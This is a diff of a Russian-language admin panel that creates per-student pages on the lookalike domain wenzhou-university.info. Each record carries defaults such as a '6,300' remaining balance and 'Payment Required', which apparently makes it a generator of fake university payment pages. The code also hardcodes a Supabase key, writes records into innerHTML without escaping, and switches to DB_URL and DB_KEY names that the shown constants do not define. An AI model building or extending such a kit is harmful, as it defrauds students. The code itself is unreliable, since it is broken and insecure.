@@ -93,30 +93,42 @@
   const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1laGZranN5c2RpYWljeG9nd29rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODMxNjQ3NTAsImV4cCI6MjA5ODc0MDc1MH0.4vsowM6tv7kkO2m5jXZA2Jou0RC4tUDMonLkmhFqO7o';
   // ------------------------------------------------
 
-  let supabaseClient = null;
+  let globalSupabase = null;
   let isDbConnected = false;
 
   try {
-    if (SUPABASE_URL && !SUPABASE_URL.includes('YOUR_PROJECT') && window.supabase) {
-      supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    if (DB_URL && !DB_URL.includes('YOUR_PROJECT') && window.supabase) {
+      globalSupabase = window.supabase.createClient(DB_URL, DB_KEY);
     }
-  } catch (e) { console.error(e); }
+  } catch (e) { 
+    console.error(e); 
+  }
 
   function updateStatusUI(type, message) {
     const dot = document.getElementById('status-dot');
     const text = document.getElementById('status-text');
-    if(dot && text) { dot.className = 'status-dot ' + type; text.textContent = message; }
+    if(dot && text) { 
+      dot.className = 'status-dot ' + type; 
+      text.textContent = message; 
+    }
   }
 
   async function checkDatabaseConnection() {
-    if (!supabaseClient) { updateStatusUI('status-offline', 'Ключи базы данных не настроены'); return; }
+    if (!globalSupabase) { 
+      updateStatusUI('status-offline', 'Ключи базы данных не настроены'); 
+      return; 
+    }
     try {
-      const { error } = await supabaseClient.from('students').select('id').limit(1);
+      const { error } = await globalSupabase.from('students').select('id').limit(1);
       if (error) throw error;
       updateStatusUI('status-online', 'База данных: Подключено');
       isDbConnected = true;
-      if (document.getElementById('admin-dashboard').style.display === 'grid') fetchPages();
-    } catch (err) { updateStatusUI('status-offline', 'Ошибка авторизации / Таблица не найдена'); }
+      if (document.getElementById('admin-dashboard').style.display === 'grid') {
+        fetchPages();
+      }
+    } catch (err) { 
+      updateStatusUI('status-offline', 'Ошибка авторизации / Таблица не найдена'); 
+    }
   }
 
   function checkPassword() {
@@ -125,17 +137,30 @@
       document.getElementById('login-screen').style.display = 'none';
       document.getElementById('admin-dashboard').style.display = 'grid';
       if (isDbConnected) fetchPages();
-    } else { alert('Неверный пароль!'); }
+    } else { 
+      alert('Неверный пароль!'); 
+    }
   }
 
-  document.getElementById('password').addEventListener('keypress', function (e) { if (e.key === 'Enter') checkPassword(); });
+  window.addEventListener('DOMContentLoaded', () => {
+    const pwdInput = document.getElementById('password');
+    if (pwdInput) {
+      pwdInput.addEventListener('keypress', function (e) { 
+        if (e.key === 'Enter') checkPassword(); 
+      });
+    }
+    checkDatabaseConnection();
+  });
 
   function generateSlug() {
     return Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 8);
   }
 
   async function createPage() {
-    if (!isDbConnected) { alert("База данных недоступна!"); return; }
+    if (!isDbConnected || !globalSupabase) { 
+      alert("База данных недоступна!"); 
+      return; 
+    }
     const dataObj = {
       slug: generateSlug(),
       username: document.getElementById('username').value || 'Unknown',
@@ -155,21 +180,31 @@
       rem_bal: document.getElementById('rem_bal').value || '6,300',
       pay_status: document.getElementById('pay_status').value || 'Payment Required'
     };
-    const { error } = await supabaseClient.from('students').insert([dataObj]);
-    if (error) { alert("Ошибка: " + error.message); } 
-    else { alert("Страница создана!"); fetchPages(); }
+    
+    const { error } = await globalSupabase.from('students').insert([dataObj]);
+    if (error) { 
+      alert("Ошибка: " + error.message); 
+    } else { 
+      alert("Страница создана!"); 
+      fetchPages(); 
+    }
   }
 
   async function fetchPages() {
-    if (!isDbConnected) return;
+    if (!isDbConnected || !globalSupabase) return;
     const listDiv = document.getElementById('list');
-    const { data, error } = await supabaseClient.from('students').select('*').order('created_at', { ascending: false });
-    if (error) { listDiv.innerHTML = "Ошибка чтения."; return; }
-    if (data.length === 0) { listDiv.innerHTML = "<p>Список пуст.</p>"; return; }
+    const { data, error } = await globalSupabase.from('students').select('*').order('created_at', { ascending: false });
+    if (error) { 
+      listDiv.innerHTML = "Ошибка чтения."; 
+      return; 
+    }
+    if (data.length === 0) { 
+      listDiv.innerHTML = "<p>Список пуст.</p>"; 
+      return; 
+    }
     listDiv.innerHTML = '';
     
     data.forEach(item => {
-      // Здесь жестко прописан ваш домен для идеальных ссылок
       const link = `https://wenzhou-university.info/${item.slug}`;
       listDiv.innerHTML += `
         <div class="student-item">
@@ -183,14 +218,12 @@
   }
 
   async function deletePage(id) {
-    if (!isDbConnected) return;
+    if (!isDbConnected || !globalSupabase) return;
     if(confirm("Удалить ссылку?")) {
-      const { error } = await supabaseClient.from('students').delete().eq('id', id);
+      const { error } = await globalSupabase.from('students').delete().eq('id', id);
       if(error) alert("Ошибка: " + error.message); else fetchPages();
     }
   }
-
-  window.onload = function() { checkDatabaseConnection(); };
 </script>
 </body>
 </html>
